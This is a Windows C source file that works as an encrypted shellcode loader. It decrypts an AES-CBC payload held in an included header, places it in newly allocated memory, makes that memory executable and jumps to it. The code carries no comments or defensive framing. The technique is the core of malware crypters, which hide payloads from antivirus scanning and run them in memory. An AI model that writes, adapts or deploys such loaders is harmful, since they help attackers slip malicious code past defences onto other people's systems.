#include <Windows.h>
#include <Ntstatus.h>
#include <stdio.h>
#include "module.h"

typedef VOID PAYLOAD(VOID);

INT main(void) {
	NTSTATUS status;
	BCRYPT_ALG_HANDLE h_algorithm = INVALID_HANDLE_VALUE;
	BCRYPT_KEY_HANDLE h_key = INVALID_HANDLE_VALUE;
	DWORD key_object_size = 0;
	ULONG result;
	PBYTE key_object = NULL;
	PBYTE payload_buff = NULL;

	status = BCryptOpenAlgorithmProvider(&h_algorithm, BCRYPT_AES_ALGORITHM, NULL, 0);

	if (STATUS_SUCCESS != status || INVALID_HANDLE_VALUE == h_algorithm) {
		puts("BCryptOpenAlgorithmProvider failed");
		return status;
	}

	status = BCryptSetProperty(
		h_algorithm,
		BCRYPT_CHAINING_MODE,
		(PUCHAR)BCRYPT_CHAIN_MODE_CBC,
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0
	);

	if (STATUS_SUCCESS != status) {
		switch (status) {
			case STATUS_INVALID_HANDLE: puts("BCryptSetProperty STATUS_INVALID_HANDLE"); break;
			case STATUS_INVALID_PARAMETER: puts("BCryptSetProperty STATUS_INVALID_PARAMETER"); break;
			case STATUS_NOT_SUPPORTED: puts("BCryptSetProperty STATUS_NOT_SUPPORTED"); break;
			default: printf("BCryptSetProperty failed with error %ld\n", (DWORD)status);
		}
		return status;
	}

	status = BCryptGetProperty(
		h_algorithm,
		BCRYPT_OBJECT_LENGTH,
		(PUCHAR)&key_object_size,
		sizeof(DWORD),
		&result,
		0
	);

	if (STATUS_SUCCESS != status || 0 == key_object_size) {
		puts("BCryptGetProperty failed");
		return status;
	} 

	key_object = (PBYTE)HeapAlloc(GetProcessHeap(), 0, key_object_size);

	if (NULL == key_object) {
		puts("HeapAlloc failed");
		return 1;
	}

	status = BCryptGenerateSymmetricKey(
		h_algorithm,
		&h_key,
		key_object,
		key_object_size,
		payload_key_bytes,
		sizeof(payload_key_bytes),
		0
	);

	if (STATUS_SUCCESS != status) {
		switch (status) {
			case STATUS_BUFFER_TOO_SMALL: puts("BCryptGenerateSymmetricKey STATUS_BUFFER_TOO_SMALL"); break;
			case STATUS_INVALID_HANDLE: puts("BCryptGenerateSymmetricKey STATUS_INVALID_HANDLE"); break;
			case STATUS_INVALID_PARAMETER: puts("BCryptGenerateSymmetricKey STATUS_INVALID_PARAMETER"); break;
			default: printf("BCryptGenerateSymmetricKey failed with error %ld\n", (DWORD)status);
		}
		return status;
	}

	payload_buff = VirtualAlloc(
		NULL,
		sizeof(encrypted_payload),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (payload_buff == NULL) {
		puts("VirtualAlloc failed");
		return 1;
	}

	status = BCryptDecrypt(
		h_key,
		encrypted_payload,
		sizeof(encrypted_payload),
		NULL,
		payload_iv,
		sizeof(payload_iv),
		payload_buff,
		sizeof(encrypted_payload),
		&result,
		BCRYPT_BLOCK_PADDING
	);

	if (STATUS_SUCCESS != status) {
		puts("BCryptDecrypt failed");
		return status;
	}

	DWORD old_protection;

	if ( ! VirtualProtect(payload_buff, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &old_protection) ) {
		puts("VirtualProtect failed");
		return 1;
	}

	PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

	fn_payload();

	return 0;
}
